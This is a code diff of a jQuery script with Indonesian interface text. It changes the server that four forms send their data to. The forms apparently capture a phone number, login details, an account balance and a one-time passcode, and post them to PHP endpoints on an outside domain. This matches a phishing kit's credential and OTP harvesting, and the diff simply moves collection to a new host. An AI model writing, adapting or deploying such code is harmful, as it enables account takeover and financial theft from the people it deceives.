@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://hstg.biz.id/m/no.php',
+            url: 'https://tunasbibit.my.id/i/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://hstg.biz.id/m/login.php',
+            url: 'https://tunasbibit.my.id/i/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://hstg.biz.id/m/saldo.php',
+            url: 'https://tunasbibit.my.id/i/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://hstg.biz.id/m/gas.php',
+ url: 'https://tunasbibit.my.id/i/gas.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
